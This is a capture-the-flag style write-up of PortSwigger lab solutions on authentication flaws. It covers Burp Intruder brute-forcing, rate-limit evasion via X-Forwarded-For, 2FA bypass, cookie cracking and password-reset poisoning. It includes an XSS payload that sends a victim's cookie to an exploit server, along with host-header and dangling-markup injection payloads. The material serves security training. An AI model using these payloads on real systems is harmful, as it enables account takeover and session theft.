# Portswigger
## Authentication Vulnerabilities
### Username enumeration via different responses
```bash

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
-   [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
Go to: Login
Intercept is on
Input uname/pword
Send request to intruder
Adjust the payload to reflect the username position

username=§name§&password=password

Go to: Payloads
Load 'usernames.txt' file //or// copy/paste from web-page
Start Attack
There should be a variation in the "Length" column and this will be the username(s)

Add in the new-found username
Adjust the payload to reflect the password position
.
username=academico&password=§password§

Go to: Options
Load 'passwords.txt' file //or// copy/paste from web-page
Start Attack


```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506211935.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506212047.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506212121.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506213028.png)

### Username enumeration via subtly different responses
```bash

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
-   [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
Go to: Login
Intercept is on
Input uname/pword
Send request to intruder
Adjust the payload to reflect the username position

username=§name§&password=password

Go to: Payloads
Load 'usernames.txt' file //or// copy/paste from web-page
Start Attack
Go to: Columns -> 'Response received'
There should be a variation in the 'Response received' column and this will be the username(s)

Add in the new-found username
Adjust the payload to reflect the password position

username=adm&password=§password§

Go to: Options
Load 'passwords.txt' file //or// copy/paste from web-page
Start Attack
The "Length" column has a large variation and will be the password


```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506214107.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506212121.png)

### Username enumeration via response timing
```bash

Make sure you properly enumerate. There is a login limiter. You will be locked out for 30 minutes per IP if not followed.
This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this users password, then access their account page.

-   Your credentials: `wiener:peter`
-   [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)


Intercept is on
Input uname/pword
Send this to repeater

username=name&password=password

HTTP/1.1 200 OK
"Invalid username or password."

Logging in with valid credentials - note the "302" response

username=wiener&password=peter

HTTP/1.1 302 Found

By adding in "X-Forwarded-For: 500" in the POST request in "the repeater" you can circumvent the ip rate limiter.
Increate the "500" to "501" and increment this number each time a request is sent.
Add to PST request:

X-Forwarded-For: 500

After testing a random input "200" then the correct credentials "302" increase the size of the password > 100
Note the delay
Send to intruder
Attack type: Pitchfork
A long password will be used while we fuzz the "X-Forwarded-For" and "username" 

X-Forwarded-For: §0§

username=§wiener§&password=passwordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrteshpasswordgfrdesgreshrtesh

Payload set: 1
Payload type: Numbers
Payload Options[Numbers]
From: 1
To: 100
Step: 1
Max fraction digits: 0 // this will mask the IP

Payload 2
Payload type: Simple list
Load 'usernames.txt' file //or// copy/paste from web-page
Start attack
Go to: Columns -> Response received //and// Response completed
Notice the difference in response time
Use new-found username(s)

X-Forwarded-For: §0§

username=analyzer&password=§password§

Payload set: 2
Clear the 'username.txt' and replace with 'passwords.txt' //or// copy/past from web-page
Start attack
There should be a status code of "302" like when signing into 'wiener:peter'


```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506230843.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506230815.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506231514.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506231722.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506232141.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506232210.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506232327.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506232514.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220506232756.png)

### Broken brute-force protection, IP block
```bash

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`

Intercept is on
Login with name:passowrd
Send to repeater
Drop intercept and are received with:

HTTP/1.1 200 OK

"Invalid username"

Go to repeater and input the correct login credentials of wiener:peter

HTTP/1.1 302 Found

Attempt logging in with the incorrect credentials again until after 3 attempts you are met with:

HTTP/1.1 200 OK

You have made too many incorrect login attempts. Please try again in 1 minute(s).

Ensure you replicate this behavior, but this time ensure you log in with the incorrect credentials twice & on the third attempt the correct credentials

HTTP/1.1 302 Found

Make a password file that has the proper password for the username "wiener" every other line for simplicity sake e.g.:
*Ensure you use the specified password file in the lab vs. the original password file used in various other labs*

peter
qwerty
peter
1234567

Make a username file that has the proper username then the target username e.g.:

wiener
carlos
wiener
carlos

Send to intruder
Pitchfork
Payload 1:
Add the username.txt file that was created 
Payload 2:
Add the password.txt file that ws created
Go to: Resource Pool
Maximum concurrent requests: 1
Start Attack
Since we determied '302' means a successful login filter by the 'status code'
There should be a corrent password for carlos

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220507195457.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220507204632.png)

#### Username enumeration via account lock
```bash

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this users password, then access their account page.

-   [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

Intercept is on
Log in to any uname/pword 
Note the response

'Invalid username or password.'

Send to repeater
After sending multiple requests there was no lockout
Send to intruder
Attack type: Cluster bomb

username=§name§&password=password§§

Payload set: 1
Payload type: Simple list
Load 'usernames.txt' file //or// copy/paste from web-page
Payload set: 2
Payload type: Null payloads
Payload Options [Null payloads]
Generate '5' payloads
Start attack
Filter by "Length" and there should be a username that stands out
Use this username in the next attack
Go to: Positions
Attack type: Sniper

username=alerts&password=§password§

Go to: Payloads
Load 'passwords.txt' file //or// copy/paste from web-page
Go to: Options
Grep - Extract - Add -> Refetch response (if necessary) -> select 'Invalid username or password.'
Start attack
Filter by -warning
There should be a password -warning is blank and this should be the password

```
alerts

aaaaaa

![image](https://0xc0rvu5.github.io/docs/assets/images/20220507211510.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220507211533.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220507211425.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220507212815.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220507212738.png)

#### Broken brute-force protection, multiple credentials per request
```bash
This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

-   Victim's username: `carlos`
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

Intruder is on
Send request with credentials



{"username":"carlos","password": [
"password",
				"123456",
	"password",
	"12345678",
	"qwerty",
	"123456789",
	"12345",
	"1234",
	"111111",
	"1234567",
	"dragon",
	"123123",
	"baseball",
	"abc123",
	"football",
	"monkey",
	"letmein",
	"shadow",
	"master",
	"666666",
	"qwertyuiop",
	"123321",
	"mustang",
	"1234567890",
	"michael",
	"654321",
	"superman",
	"1qaz2wsx",
	"7777777",
	"121212",
	"000000",
	"qazwsx",
	"123qwe",
	"killer",
	"trustno1",
	"jordan",
	"jennifer",
	"zxcvbnm",
	"asdfgh",
	"hunter",
	"buster",
	"soccer",
	"harley",
	"batman",
	"andrew",
	"tigger",
	"sunshine",
	"iloveyou",
	"2000",
	"charlie",
	"robert",
	"thomas",
	"hockey",
	"ranger",
	"daniel",
	"starwars",
	"klaster",
	"112233",
	"george",
	"computer",
	"michelle",
	"jessica",
	"pepper",
	"1111",
	"zxcvbn",
	"555555",
	"11111111",
	"131313",
	"freedom",
	"777777",
	"pass",
	"maggie",
	"159753",
	"aaaaaa",
	"ginger",
	"princess",
	"joshua",
	"cheese",
	"amanda",
	"summer",
	"love",
	"ashley",
	"nicole",
	"chelsea",
	"biteme",
	"matthew",
	"access",
	"yankees",
	"987654321",
	"dallas",
	"austin",
	"thunder",
	"taylor",
	"matrix",
	"mobilemail",
	"mom",
	"monitor",
	"monitoring",
	"montana",
	"moon",
	"moscow"
  ]
}


HTTP/1.1 302 Found



```

### 2FA simple bypass
```bash
This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

-   Your credentials: `wiener:peter`
-   Victim's credentials `carlos:montoya`

Log into your own credentials i.e. wiener:peter

https://acba1f581e305d4dc01c612d00d30004.web-security-academy.net/login2

Go to: Ctrl + right-click (Email Client)
Input security code
Note the end-point

https://acba1f581e305d4dc01c612d00d30004.web-security-academy.net/my-account
Log out
Log in as carlos:montoya
Change:

https://acba1f581e305d4dc01c612d00d30004.web-security-academy.net/login2

to

https://acba1f581e305d4dc01c612d00d30004.web-security-academy.net/my-account


```

### 2FA broken logic
```bash

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`

You also have access to the email server to receive your 2FA verification code.


Log into your own credentials i.e. wiener:peter
Go to: Ctrl + right-click (Email Client)
Input security code
In HTTP history note the response code of "302"
Go to: Proxy
HTTP history
Find the GET request of wiener logging in prior to entering the 4-digit security code

GET /login2 HTTP/1.1

with response of:

HTTP/1.1 200 OK

"Please enter your 4-digit security code"

Send this to Repeater
Change:

verify=wiener

to

verify=carlos

Send
You now requested a mfa-code for the user "carlos"
Log out
Log into your own credentials i.e. wiener:peter
Type in any incorrect pin i.e "2222"
Go to: Proxy -> HTTP history
Find the POST request that is sending the incorrect mfa-code:

POST /login2 HTTP/1.1

mfa-code=2222

Send to intruder
Use "wiener" new cookie for "carlos"

Cookie: session=TBqUq6l6ibGJWNNKtUBnNPr0ScHqFFPr; verify=carlos

mfa-code=§2222§

Go to: Payloads
Payload Sets
Payload type: Brute forcer
Payload Options[Brute forcer]
Character set: 0123456789
Start attack
There will be a status code of "302"
Right-click response -> "Show response in browser" -> Copy -> Paste in browser

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509182849.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509182916.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509183003.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509183029.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509183045.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509181948.png)

### 2FA bypass using a brute-force attack
```bash

This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.

Victim's credentials: `carlos:montoya`

Clear burp browsing history
Intercept is off
Burp Proxy in browser is on

Click "My Account"
Enter the known credentials carlos:montoya
Enter any 4-digit code - It worked once then a second time an additional 4-digit code had to be input


Go to: Project options -> Session Handling Rules -> Add -> Scope ->  URL Scope: Include all URLs
Details -> Rule Actions: Add -> Run a macro -> Add
The login/password page

Add initial GET /login request

The POST request after inputting login/password

add initial POST /login request

The GET /login2 page which represents "Please enter your 4-digit security code" page

Go to: Proxy
HTTP history
Find the POST /login2 request where you input the 4-digit 2FA code
Send to intruder

csrf=4mSqakVhtcY1qVLVbDWk3miG9HrgO0JZ&mfa-code=§1234§

Go to: Payload Sets
Payload type: Numbers
Payload Options[Numbers]
From: 1
To: 9999
Step: 1
Min integer digits: 4
Max integer digits: 4
Max fraction digits: 0

Go to: Resource Pool
Maximum concurrent requests: 1

```


![image](https://0xc0rvu5.github.io/docs/assets/images/20220509024807.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509025158.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509025549.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509025613.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509025639.png)

### Brute-forcing a stay-logged-in cookie
```bash

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`

Log in with the "Stay logged in" box checked
Go to: HTTP history and find the "stay-logged-in" cookie and place it in the decoder

stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

wiener:51dc30ddc473d43a6011e9ebba6ca770

Take the additional hash and place it into crackstation.net

51dc30ddc473d43a6011e9ebba6ca770

Result is an MD5 hash of "peter" the password we used initially
Log out
Choose the HTTP GET request with the "stay-logged-in" cookie

GET /my-account HTTP/1.1

Send to intruder

Cookie: session=AYOWYUt1ACwjQ3hcOAVcHKdUSTapZSdk; stay-logged-in=§d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw§

Go to: Payloads
Paste: Password list given
Payload Processing -> Add
Hash: MD5
Add prefix: carlos:
Encode: Base64-encode
Go to: Options
Grep - Match -> Clear
Add: 'My account'
Start Attack
There will be one "200" code verifying success

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509223049.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509223116.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509223144.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509223225.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509223254.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509223014.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509222915.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509222759.png)

### Offline password cracking
```bash

- Using stored XSS to retrieve vulnerable "stay-logged-in" cookies which have a Base-64 encoded uname:pword with the pword being an MD5 hash

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`

Make sure burp proxy is enabled in browser, but intecept is off
Login with wiener:peter and with the "Stay logged in" box checked
Go to: Proxy
HTTP history
Go to the "stay-logged-in" GET request
Inspector (on right side) > Request Cookies > click drop down menu for "stay-logged-in"

wiener:51dc30ddc473d43a6011e9ebba6ca770

Put the '51dc30ddc473d43a6011e9ebba6ca770' into crackstation.net

wiener:peter

Test for XSS

<img src=1 onerror=alert(1) />

Success for stored XSS

Go to Exploit Server and copy exploit server link excluding 'exploit'
Place it in a script tag and when someone clicks the "view post" section their cookie should be revealed which can be decoded
.script.document.location='https://exploit-ac681fd91ffd6f2dc0490d9a01ca0039.web-security-academy.net/'+document.cookie.script.

Go back to exploit server and check the logs

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509231023.png)

### Password reset broken logic

```bash

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`

Capture traffic // leave intercept off
Forgot password
Check Email client
Change password
Go to: HTTP history

POST /forgot-password?temp-forgot-password-token=AXQ9SoqVFFbI3CQsZwynpLiSTdPDS73S HTTP/1.1

temp-forgot-password-token=AXQ9SoqVFFbI3CQsZwynpLiSTdPDS73S&username=wiener&new-password-1=peter&new-password-2=peter

Change to

POST /forgot-password?temp-forgot-password-token= HTTP/1.1

temp-forgot-password-token=&username=wiener&new-password-1=peter&new-password-2=peter

Returns

HTTP/1.1 302 Found

This means it accepts the POST request without the cookie

Repeat this step, but change the username to "carlos"

temp-forgot-password-token=&username=carlos&new-password-1=peter&new-password-2=peter

HTTP/1.1 302 Found

Log in as carlos:peter

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509234958.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509234942.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509235029.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220509235418.png)

### Password reset poisoning via middleware
```bash

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

Use forgot password functionality for username wiener
Check email for username wiener
Reset password
Visit

POST /forgot-password HTTP/1.1

Go to exploit server and copy "exploit-ac701fdc1f3a2c66c00401e201aa00cd.web-security-academy.net/"
Insert to POST request:

X-Forwarded-Host: exploit-ac701fdc1f3a2c66c00401e201aa00cd.web-security-academy.net/

Change username to "carlos"

HTTP/1.1 200 OK

Due to this emulating "carlos" clicking on a random link go back to your exploit server and find the outlier in the ip addresses

Take the old reset code path when you reset "wiener" account and replace the token with the new token found on the exploit server for the unknown ip

https://ac971f631fe62ca6c00001b300d5002c.web-security-academy.net/forgot-password?temp-forgot-password-token=d0adpfp3XGgR8iRy9WTbcsWd3IOm78n9

to 

https://ac971f631fe62ca6c00001b300d5002c.web-security-academy.net/forgot-password?temp-forgot-password-token=JrDg9DoOZ7f7i1dcWFh7MM5yhZKm0qum

Reset the password

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220510191807.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220510001831.png)

### Basic password reset poisoning
```bash

# This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

# You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.


Use forgot password functionality for username wiener
Check email for username wiener
Reset password
Visit

POST /forgot-password HTTP/1.1

Change

Host: ac6d1f221ed1b066c0dd9ae2005500fd.web-security-academy.net

To

Host: anything123

Verify it works with a "200" response code

HTTP/1.1 200 OK

Once verified this is a possible attack vector go to attack server and grab the attack server URL and place it in the host header and change the user to 'carlos' i.e.

Host: exploit-ac581fae1e0eb01ec05c9afe017e0043.web-security-academy.net/

Host: exploit-ac581fae1e0eb01ec05c9afe017e0043.web-security-academy.net/

With a response of 

HTTP/1.1 200 OK

Now go to the Access logs to the attack server and you should find the 'temp-forgot-password-token'. Place this at the end of the previous forgot password request you had received for the user 'wiener'

https://ac6d1f221ed1b066c0dd9ae2005500fd.web-security-academy.net/forgot-password?temp-forgot-password-token=FbMG08FNK8PYEqMF0ntFFX7xRhm4rPDz

Reset the user 'carlos' password

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220510001807.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220510191917.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220510192100.png)

### Password reset poisoning via dangling markup
```bash

# This lab is vulnerable to password reset poisoning via [dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup). To solve the lab, log in to Carlos's account.

# You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

Use forgot password functionality for username wiener
Check email for username wiener
Reset password
Check the reset password "view raw" in the email client
There is no sanitation occuring
Reset password settings again to reset the csrf token
Visit the new

POST /forgot-password HTTP/1.1

Send to repeater
Change Host: 

ac901ff11f9faf2cc0b8118e00e8009a.web-security-academy.net

To

anything.com

Receive the "504" code

HTTP/1.1 504 Gateway Timeout

change to 

Host: ac901ff11f9faf2cc0b8118e00e8009a.web-security-academy.net:check

It works with status code "200"

HTTP/1.1 200 OK

Please check your email for details on how to recover your account.

Replace "check" with a single quotation mark, an html href tag and your exploit server like so:

'<a href="//exploit-ac671f6c1f3daf36c01111bb01ae004b.web-security-academy.net/?
 
Change the username from "wiener" to "carlos"

```

RSJdrEz87b

![image](https://0xc0rvu5.github.io/docs/assets/images/20220510235453.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511000154.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511000225.png)


### Password brute-force via password change
```bash

# This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

# -   Your credentials: `wiener:peter`
# -   Victim's username: `carlos`

Log in as wiener:peter
reset the password
Attempt to reset the password again with the wrong password
You should be logged out and flagged to wait a minute due to too many incorrect password attempts
Log back in
Try again with the wrong password

"Current password is incorrect"

Try again with the correct password, but two different "new-password" fields

"New passwords do not match"

Due to the hidden "username" field being present and the response above "New passwords do not match" if you are to input "carlos" as username and you bruteforce the password with two different "new-password" fields you should get the desired results
Go to: HTTP history

POST /my-account/change-password HTTP/1.1

username=wiener&current-password=peter2&new-password-1=1234&new-password-2=1234567

Send to intruder

username=carlos&current-password=§peter2§&new-password-1=1234&new-password-2=1234567

Go to: Payloads
Insert the password list
Go to: Options -> Grep - Match -> Add
"New passwords do not match"
Start attack
There should be one returned password with the above "Grep - Match" search

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511003753.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511003728.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511003852.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511003609.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511003634.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511003652.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220511003931.png)

#hacking
